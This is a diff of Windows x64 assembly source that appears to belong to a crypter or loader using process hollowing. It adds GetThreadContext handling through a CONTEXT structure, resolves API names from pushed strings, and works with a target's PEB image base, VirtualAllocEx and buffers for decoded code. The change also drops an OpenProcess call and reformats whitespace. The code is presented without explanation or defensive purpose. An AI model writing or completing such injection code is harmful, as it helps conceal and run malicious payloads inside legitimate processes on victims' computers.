@@ -6,85 +6,165 @@ section .BSS
 	
 section .data	
 	
+struc CONTEXT
+       .P1Home:                                      resq 1
+       .P2Home:                                      resq 1
+       .P3Home:                                      resq 1
+       .P4Home:                                      resq 1
+       .P5Home:                                      resq 1
+       .P6Home:                                      resq 1
+       .ContextFlags:                                resd 1
+       .MxCsr:                                       resd 1
+       .SegCs:                                       resw 1
+       .SegDs:                                       resw 1
+       .SegEs:                                       resw 1
+       .SegFs:                                       resw 1
+       .SegGs:                                       resw 1
+       .SegSs:                                       resw 1
+       .EFlags:                                      resd 1
+       .Dr0:                                         resq 1
+       .Dr1:                                         resq 1
+       .Dr2:                                         resq 1
+       .Dr3:                                         resq 1
+       .Dr6:                                         resq 1
+       .Dr7:                                         resq 1
+       .Rax:                                         resq 1
+       .Rcx:                                         resq 1
+       .Rdx:                                         resq 1
+       .Rbx:                                         resq 1
+       .Rsp:                                         resq 1
+       .Rbp:                                         resq 1
+       .Rsi:                                         resq 1
+       .Rdi:                                         resq 1
+       .R8:                                          resq 1
+       .R9:                                          resq 1
+       .R10:                                         resq 1
+       .R11:                                         resq 1
+       .R12:                                         resq 1
+       .R13:                                         resq 1
+       .R14:                                         resq 1
+       .R15:                                         resq 1
+       .Rip:                                         resq 1
+endstruc
+	
+ctx istruc CONTEXT 
+       at CONTEXT.P1Home,                            dq 0
+       at CONTEXT.P2Home,                            dq 0
+       at CONTEXT.P3Home,                            dq 0
+       at CONTEXT.P4Home,                            dq 0
+       at CONTEXT.P5Home,                            dq 0
+       at CONTEXT.P6Home,                            dq 0
+       at CONTEXT.ContextFlags,                      dd 0
+       at CONTEXT.MxCsr,                             dd 0
+       at CONTEXT.SegCs,                             dw 0
+       at CONTEXT.SegDs,                             dw 0
+       at CONTEXT.SegEs,                             dw 0
+       at CONTEXT.SegFs,                             dw 0
+       at CONTEXT.SegGs,                             dw 0
+       at CONTEXT.SegSs,                             dw 0
+       at CONTEXT.EFlags,                            dd 0
+       at CONTEXT.Dr0,                               dq 0
+       at CONTEXT.Dr1,                               dq 0
+       at CONTEXT.Dr2,                               dq 0
+       at CONTEXT.Dr3,                               dq 0
+       at CONTEXT.Dr6,                               dq 0
+       at CONTEXT.Dr7,                               dq 0
+       at CONTEXT.Rax,                               dq 0
+       at CONTEXT.Rcx,                               dq 0
+       at CONTEXT.Rdx,                               dq 0
+       at CONTEXT.Rbx,                               dq 0
+       at CONTEXT.Rsp,                               dq 0
+       at CONTEXT.Rbp,                               dq 0
+       at CONTEXT.Rsi,                               dq 0
+       at CONTEXT.Rdi,                               dq 0
+       at CONTEXT.R8,                                dq 0
+       at CONTEXT.R9,                                dq 0
+       at CONTEXT.R10,                               dq 0
+       at CONTEXT.R11,                               dq 0
+       at CONTEXT.R12,                               dq 0
+       at CONTEXT.R13,                               dq 0
+       at CONTEXT.R14,                               dq 0
+       at CONTEXT.R15,                               dq 0
+       at CONTEXT.Rip,                               dq 0
+iend
+	
     struc PROCESSINFO
-	.hProcess 						resd 2
-	.hThread 						resd 2
-        .dwProcessId 						resd 1
-        .dwThreadId 						resd 1
+        .hProcess                                    resd 2
+        .hThread                                     resd 2
+        .dwProcessId                                 resd 1
+        .dwThreadId                                  resd 1
     endstruc
 	
 		
     ProcInfo istruc PROCESSINFO
-        at PROCESSINFO.hProcess,				dd 0
-        at PROCESSINFO.hThread,					dd 0
-        at PROCESSINFO.dwProcessId,				dw 0
-        at PROCESSINFO.dwThreadId,				dw 0
+        at PROCESSINFO.hProcess,                     dd 0
+        at PROCESSINFO.hThread,                      dd 0
+        at PROCESSINFO.dwProcessId,                  dw 0
+        at PROCESSINFO.dwThreadId,                   dw 0
     iend
 	
 	
    struc STARTUPINFOA 
-        .cb 							resd 1
-        .lpReserved 						resb 8
-        .lpDesktop 						resb 8
-        .lpTitle 						resb 0xc
-        .dwX 							resd 1
-        .dwY 							resd 1
-        .dwXSize 						resd 1
-        .dwYSize 						resd 1
-        .dwXCountChars 						resd 1
-        .dwYCountChars 						resd 1
-        .dwFillAttribute 					resd 1
-        .dwFlags 						resd 1
-        .wShowWindow 						resw 1
-        .cbReserved2 						resw 2
-        .lpReserverd2 						resb 0xA
-        .hStdInput 						resd 2
-        .hStadOutput 						resd 2
-        .hStdError 						resd 2
+        .cb                                          resd 1
+        .lpReserved                                  resb 8
+        .lpDesktop                                   resb 8
+        .lpTitle                                     resb 0xc
+        .dwX                                         resd 1
+        .dwY                                         resd 1
+        .dwXSize                                     resd 1
+        .dwYSize                                     resd 1
+        .dwXCountChars                               resd 1
+        .dwYCountChars                               resd 1
+        .dwFillAttribute                             resd 1
+        .dwFlags                                     resd 1
+        .wShowWindow                                 resw 1
+        .cbReserved2                                 resw 2
+        .lpReserverd2                                resb 0xA
+        .hStdInput                                   resd 2
+        .hStadOutput                                 resd 2
+        .hStdError                                   resd 2
     endstruc
 	
-
     startup istruc STARTUPINFOA 
-       at STARTUPINFOA.cb, 					dd 0
-       at STARTUPINFOA.lpReserved, 				db 0
-       at STARTUPINFOA.lpDesktop, 				db 0
-       at STARTUPINFOA.lpTitle, 				db 0
-       at STARTUPINFOA.dwX, 					dd 0
-       at STARTUPINFOA.dwY, 					dd 0
-       at STARTUPINFOA.dwXSize, 				dd 0
-       at STARTUPINFOA.dwYSize, 				dd 0
-       at STARTUPINFOA.dwXCountChars, 				dd 0
-       at STARTUPINFOA.dwYCountChars, 				dd 0
-       at STARTUPINFOA.dwFillAttribute, 			dd 0
-       at STARTUPINFOA.dwFlags, 				dd 0
-       at STARTUPINFOA.wShowWindow, 				dw 0
-       at STARTUPINFOA.cbReserved2, 				dw 0
-       at STARTUPINFOA.lpReserverd2, 				db 0
-       at STARTUPINFOA.hStdInput, 				dd 0
-       at STARTUPINFOA.hStadOutput, 				dd 0
-       at STARTUPINFOA.hStdError, 				dd 0
+       at STARTUPINFOA.cb,                           dd 0
+       at STARTUPINFOA.lpReserved,                   db 0
+       at STARTUPINFOA.lpDesktop,                    db 0
+       at STARTUPINFOA.lpTitle,                      db 0
+       at STARTUPINFOA.dwX,                          dd 0
+       at STARTUPINFOA.dwY,                          dd 0
+       at STARTUPINFOA.dwXSize,                      dd 0
+       at STARTUPINFOA.dwYSize,                      dd 0
+       at STARTUPINFOA.dwXCountChars,                dd 0
+       at STARTUPINFOA.dwYCountChars,                dd 0
+       at STARTUPINFOA.dwFillAttribute,              dd 0
+       at STARTUPINFOA.dwFlags,                      dd 0
+       at STARTUPINFOA.wShowWindow,                  dw 0
+       at STARTUPINFOA.cbReserved2,                  dw 0
+       at STARTUPINFOA.lpReserverd2,                 db 0
+       at STARTUPINFOA.hStdInput,                    dd 0
+       at STARTUPINFOA.hStadOutput,                  dd 0
+       at STARTUPINFOA.hStdError,                    dd 0
     iend
 
-    TamArqProgram times 8 					dq 0
-    TamArqTarget times 8 					dq 0
-    bufferFileName times 32 					db 0
-    Buffer times 800000 					db 0
-    addressAlocado times 8 					dq 0
-    addressAlocadoEx times 8 					dq 0
-    handle times 8 						dq 0
-    entrypointTarget times 8 					dq 0
-    GetSizeTarget times 8 					dq 0
-    lpPebImageBase times 8 					dq 0
-    openProcessH times 8 					dq 0
-    lpContext times 8 						dd 0 
-    allocex times 8 						dd 0 
-    AddressEntryPoint times 8 					dd 0
-    PID times 8 						dd 0
-    alloc times 8 						dd 0
+    TamArqProgram times 8                            dq 0
+    TamArqTarget times 8                             dq 0
+    bufferFileName times 32                          db 0
+    Buffer times 800000                              db 0
+    addressAlocado times 8                           dq 0
+    addressAlocadoEx times 8                         dq 0
+    handle times 8                                   dq 0
+    entrypointTarget times 8                         dq 0
+    GetSizeTarget times 8                            dq 0
+    lpPebImageBase times 8                           dq 0
+    openProcessH times 8                             dq 0
+    lpContext times 8                                dd 0 
+    allocex times 8                                  dd 0 
+    AddressEntryPoint times 8                        dd 0
+    alloc times 8                                    dd 0
 	
 section .codered
 	CodeRed:
-	Buffer2 times 800000 					db 0
+	Buffer2 times 800000                         db 0
 	
 section .deccode
 	decCode:
@@ -186,8 +266,34 @@ section .deccode
 	add rax, 0x50
 	mov ebx, [eax]
 	mov [GetSizeTarget],ebx
-	
 	mov [lpPebImageBase], rcx
+	
+	
+	call Locate_kernel32
+	;lookup GetThreadContext
+	mov rax, "dContext"
+	push Rax
+	mov rax, "GetThrea" 
+	push rax
+	mov [rsp+0x10], dword 0x00
+	lea rdx, [rsp]
+	mov rcx, r8
+	sub rsp, 0x30
+	call R14
+	mov r12, rax
+	
+	;call GetThreadContext
+	mov [ctx+CONTEXT.ContextFlags], dword 0x100002
+	mov rax, [ProcInfo+PROCESSINFO.hThread]
+	lea rdx, [ctx+CONTEXT.P1Home]
+	mov rcx, rax
+	call r12
+	
+	
+	
+	
+	
+	
 	
 	call Locate_kernel32
 	call LoadLibrary
@@ -205,29 +311,7 @@ section .deccode
 		add rsp, 0x30
 		add rsp, 0x10
 
-	OpenProcess:
-		;Lookup OpenProcess
-		mov rax, "ess"
-		push rax
-		mov rax, "OpenProc"
-		push rax
-		lea rdx, [rsp]
-		mov rcx, r15
-		sub rsp, 0x30
-		call r14
-		mov r12, rax
-		add rsp, 0x30
 
-		;call OpenProcess
-		xor edx,edx
-		mov r8, [ProcInfo+PROCESSINFO.dwProcessId]
-		mov ecx, 0x1FFFFF
-		sub rsp, 0x30
-		call r12
-		mov rbp, rax
-		add rsp, 0x30
-		mov r13, rax
-		mov [openProcessH], rax
 	
 	call Locate_kernel32
 	VirtualAllocEx:
